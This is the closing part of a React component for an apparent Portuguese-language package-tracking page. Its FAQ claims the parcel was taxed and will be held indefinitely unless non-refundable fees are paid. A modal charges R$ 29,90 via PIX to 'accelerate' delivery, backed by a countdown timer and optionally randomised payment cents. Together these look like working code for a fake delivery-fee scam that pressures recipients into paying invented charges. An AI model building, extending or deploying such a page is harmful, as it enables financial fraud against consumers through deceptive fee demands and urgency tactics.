                            </div>
                        )}

                        {/* FAQ SECTION */}
                        <div style={{ textAlign: 'left', marginTop: '40px', borderTop: '1px solid rgba(0,85,255,0.08)', paddingTop: '32px' }}>
                            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, marginBottom: '20px', color: '#0a1628', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                <Package size={20} color="#ef4444" /> Informações Importantes
                            </h3>

                            <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                                <FaqItem
                                    q="Por que meu pedido foi taxado?"
                                    a="Seu pedido foi selecionado para uma conferência administrativa de rotina ou incidência de tributos interestaduais, conforme as normas de transporte vigentes."
                                />
                                <FaqItem
                                    q="O que acontece se eu não pagar?"
                                    a="Caso o pagamento não seja identificado em até 7 dias, o objeto pode ficar retido no centro de processamento ou ser reavaliado, atrasando indefinidamente a entrega."
                                />
                                <FaqItem
                                    q="Qual o prazo para liberação?"
                                    a="Após a confirmação do pagamento das taxas pendentes, o sistema libera o pacote para a rota final de entrega em um prazo médio de 24 a 72 horas úteis."
                                />
                                <FaqItem
                                    q="O valor é reembolsável?"
                                    a="Não. As taxas de processamento e tributos são obrigatórios para a continuidade do transporte e não são passíveis de devolução após o processamento."
                                />
                            </div>
                        </div>

                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: '#475569', marginTop: '32px', cursor: 'pointer', fontWeight: 700, fontSize: '0.9rem', textDecoration: 'underline' }}>{taxPixPaid ? 'Fechar' : 'Voltar para o rastreio'}</button>
                    </div>
                </div>
            )}

            {/* Modal Acelerar */}
            {showExpressModal && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}>
                    <div style={{
                        background: 'rgba(255,255,255,0.95)',
                        backdropFilter: 'blur(24px)',
                        border: '1px solid rgba(0,85,255,0.1)',
                        borderRadius: '32px',
                        width: '100%',
                        maxWidth: '440px',
                        maxHeight: '90vh',
                        padding: '40px',
                        boxShadow: '0 24px 80px rgba(0,40,120,0.15)',
                        animation: 'fadeIn 0.3s ease',
                        textAlign: 'center',
                        overflowY: 'auto',
                        position: 'relative'
                    }} onClick={e => e.stopPropagation()}>
                        <button
                            onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}
                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(0,85,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#94a3b8', cursor: 'pointer' }}
                        >
                            <X size={18} />
                        </button>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Truck size={40} color="#0055ff" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Acelerar Entrega</h2>
                        <p style={{ color: '#475569', lineHeight: 1.6, marginBottom: '32px', fontWeight: 500 }}>
                            Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
                        </p>

                        {!pixData && !pixLoading && (
                            <button onClick={async () => {
                                setPixLoading(true);
                                try {
                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
                                    const finalAmount = Number(`29.${cents < 10 ? '0' + cents : cents}`);

                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento', codigo: trackingData?.codigo || '' })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setPixData(data.data);
                                        setTimeLeft(20 * 60); // 20 minutos
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #0055ff, #3b82f6)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(0, 85, 255, 0.3)' }}>
                                Pagar R$ 29,90 via PIX Agora
                            </button>
                        )}
                        {pixLoading && (
                            <div style={{ color: '#0055ff', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {pixData && !pixPaid && (
                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#0055ff', fontWeight: 800, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                    R$ {pixData.amount ? pixData.amount.toFixed(2).replace('.', ',') : '29,90'}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={pixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(0,0,0,0.05)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#475569', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(0,0,0,0.1)' }}>
                                    {pixData.qr_code}
                                </div>
                                {timeLeft !== null && (
                                    <div style={{ marginBottom: '16px', color: '#0055ff', fontWeight: 800, fontSize: '1rem', background: 'rgba(0,85,255,0.08)', padding: '8px', borderRadius: '10px' }}>
                                        🕒 Expira em: {formatTime(timeLeft)}
                                    </div>
                                )}
                                <p style={{ fontSize: '0.85rem', color: '#64748b', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button
                                    onClick={() => {
                                        navigator.clipboard.writeText(pixData.qr_code);
                                        setCopied(true);
                                        setTimeout(() => setCopied(false), 2000);
                                    }}
                                    style={{
                                        padding: '12px 24px',
                                        background: copied ? '#10b981' : '#4f46e5',
                                        border: 'none',
                                        borderRadius: '12px',
                                        color: 'white',
                                        cursor: 'pointer',
                                        fontSize: '0.95rem',
                                        fontWeight: 800,
                                        transition: 'all 0.3s ease',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        gap: '8px',
                                        margin: '0 auto',
                                        width: '100%'
                                    }}
                                >
                                    {copied ? (
                                        <><CheckCircle size={18} /> Copiado com sucesso!</>
                                    ) : (
                                        'Copiar Código PIX'
                                    )}
                                </button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {pixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#059669', fontWeight: 900 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.95rem', color: '#0f172a', fontWeight: 500, marginTop: '8px' }}>Seu processo de aceleração foi ativado. Você receberá atualizações em breve.</p>
                            </div>
                        )}

                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: '#475569', marginTop: '20px', cursor: 'pointer', fontWeight: 700, textDecoration: 'underline' }}>{pixPaid ? 'Fechar' : 'Cancelar'}</button>
                    </div>
                </div>
            )}
        </div>
    );
};

const FaqItem: React.FC<{ q: string; a: string }> = ({ q, a }) => (
    <div>
        <div style={{ color: '#ef4444', fontWeight: 900, fontSize: '1rem', marginBottom: '6px', textTransform: 'uppercase' }}>{q}</div>
        <div style={{ color: '#0f172a', fontSize: '0.95rem', lineHeight: 1.6, fontWeight: 500 }}>{a}</div>
    </div>
);

export default TrackingPage;
